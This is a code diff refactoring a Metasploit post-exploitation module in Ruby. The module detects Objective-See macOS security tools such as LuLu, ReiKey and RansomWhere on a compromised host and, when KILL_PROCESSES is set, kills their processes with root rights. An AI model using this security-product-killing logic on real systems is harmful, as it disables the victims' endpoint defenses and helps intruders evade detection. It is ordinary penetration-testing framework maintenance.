@@ -42,10 +42,6 @@ class MetasploitModule < Msf::Post
 
     attr_accessor :name, :path, :pids
 
-    cattr_accessor :installed_products
-
-    @@installed_products = []
-
     # We pass in an instance of MetasploitModule in order to access Metasploit API methods via send
     # Rather than retrieving processes every time we create a new instance of ObjectiveSee we'll do it once and
     # pass that data in order to retireve the pid(s) associated w each product
@@ -56,9 +52,6 @@ class MetasploitModule < Msf::Post
       @pids = []
 
       if installed?
-        # ObjectiveSee.installed_products => [<ObjectiveSee>,<ObjectiveSee>]
-        @@installed_products << self
-
         # `processes` is an array of hashes, composed of the name of the program and the pid
         # ex. [{"name"=>"configd", "pid"=>116}, {"name"=>"logd", "pid"=>104},..
 
@@ -72,10 +65,10 @@ class MetasploitModule < Msf::Post
 
     def kill
       @pids.each do |pid|
-        result = kill_process pid 
+        result = kill_process pid
         print_good "Kill signal for #{@name} #{pid} was successful" if result
-      end 
-    end 
+      end
+    end
   end
 
   # Determine which products are installed and their ppid if any
@@ -83,9 +76,7 @@ class MetasploitModule < Msf::Post
     [
       'LuLu', 'BlockBlock Helper', 'Do Not Disturb',
       'ReiKey', 'RansomWhere', 'OverSight'
-    ].map do |prod|
-      ObjectiveSee.new prod, self, @processes
-    end
+    ].map { |prod| ObjectiveSee.new prod, self, @processes }.filter(&:installed?)
   end
 
   def fail_no_root
@@ -100,22 +91,23 @@ class MetasploitModule < Msf::Post
     @processes = get_processes
 
     print_status('Enumerating Objective-See security products...')
-    enumerate
 
-    
-    if ObjectiveSee.installed_products.empty?
-      print_error("No Objective-See products were found to be installed on the system.")
+    products = enumerate
+
+    if products.empty?
+      print_error('No Objective-See products were found to be installed on the system.')
     else
       print_good('The following Objective-See products were found installed on the system:')
-      ObjectiveSee.installed_products.each { |prod| print_good("Found #{prod.name} with pid #{prod.pids.inspect}") }
+      products.each { |prod| print_good("Found #{prod.name} with pid #{prod.pids.inspect}") }
     end
 
-    installed_product = { 'installed products' => ObjectiveSee.installed_products.map {|prod| prod.name}.join(', ') }
-    report_note(host: target_host, type: 'osx.antivirus', data: installed_product, update: :unique_data)
+    installed_product = { 'installed products' => products.map(&:name).join(', ') }
+    report_note(host: target_host, type: 'osx.antivirus', 
+                data: installed_product, update: :unique_data)
 
     if datastore['KILL_PROCESSES']
       fail_no_root
-      ObjectiveSee.installed_products.each { |prod| prod.kill }
+      products.each(&:kill)
     end
   end
 end
